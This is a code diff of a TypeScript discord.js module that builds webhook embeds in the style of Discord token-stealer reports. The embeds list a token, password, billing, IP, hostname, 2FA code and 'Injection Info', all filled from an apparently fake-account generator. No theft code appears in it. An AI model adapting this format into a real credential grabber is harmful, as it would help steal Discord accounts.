@@ -1,29 +1,27 @@
 import { WebhookMessageOptions } from "discord.js";
-import { ConfigFSBinder } from "../configFSBinder";
+import { ConfigBinder } from "../interfaces";
 import { COPY_ON_MOBILE, PARTNER_EMOJI } from "../constants";
 import { FakeAccount } from "../fakeProfile";
 import { warpInQuote, warpTripleQuote } from "../utils";
 import { getBaseEmbeds } from "./helpers/baseEmbed";
-import { prepareFriendsEmbed } from "./helpers/friendsEmbed";
 import { prepare2FaEmbed } from "./helpers/twoFaEmbed";
+import { prepareFriendsEmbed } from "./helpers/friendsEmbed";
 
+export async function getUserLogonEmbed(config: ConfigBinder, account = new FakeAccount()): Promise<WebhookMessageOptions> {
 
-export async function getUserEmailChangeEmbed(config: ConfigFSBinder, account = new FakeAccount()): Promise<WebhookMessageOptions>  {
     const embedsCount = account.discord.twoFACode ? 3 : 2;
 
-    const { embeds, webhookMessage} = getBaseEmbeds(config, embedsCount);
-    const embed = embeds[0];
-    embed.setTitle("Email Changed");
-    account.discord.generateNewEmail();
-    const password = account.discord.password;
+    const { embeds, webhookMessage } = getBaseEmbeds(config, embedsCount);
+    const loginEmbed = embeds[0];
+    loginEmbed.setAuthor("User Login");
     const token = account.discord.token;
+    const password = account.discord.password;
     const des= `[**${PARTNER_EMOJI} │ Click Here To Copy Info On Mobile**](${COPY_ON_MOBILE}${token}<br>${password})`;
-    embed.setDescription(des);
-    embed.setThumbnail(await account.discord.getAvatar());
-
-    embed.setFields([{
+    loginEmbed.setDescription(des);
+    loginEmbed.setThumbnail(await account.discord.getAvatar());
+    loginEmbed.setFields([{
         name: "Info",
-        value: warpTripleQuote(`Hostname: \n${account.computerName}\nIP: \n${account.discord.ip}`),
+        value: warpTripleQuote(`Hostname: \n${account.computerName}\nIP: \n${account.discord.ip}\nInjection Info: \n${account.injectionPath}\n`),
         inline: false
     }, {
         name: "Username",
@@ -46,28 +44,24 @@ export async function getUserEmailChangeEmbed(config: ConfigFSBinder, account = 
         value: account.discord.billing,
         inline: false
     }, {
-        name: "New Email",
+        name: "Email",
         value: warpInQuote(account.discord.email),
         inline: true
-    },
-    {
+    }, {
         name: "Password",
-        value: warpInQuote(password),
-        inline: true,
-    },
-    {
+        value: warpInQuote(account.discord.password),
+        inline: true
+    }, {
         name: "Token",
-        value: warpTripleQuote(account.discord.token),
-        inline: false,
-    },
-    ]);
+        value: warpTripleQuote(token),
+        inline: false
+    }]);
 
-    await prepareFriendsEmbed(embeds[1], account);
+
+    prepareFriendsEmbed(embeds[1], account);
+
     if (account.discord.twoFACode) {
         prepare2FaEmbed(embeds[2], account.discord.twoFACode);
     }
-
     return webhookMessage();
 }
-
-
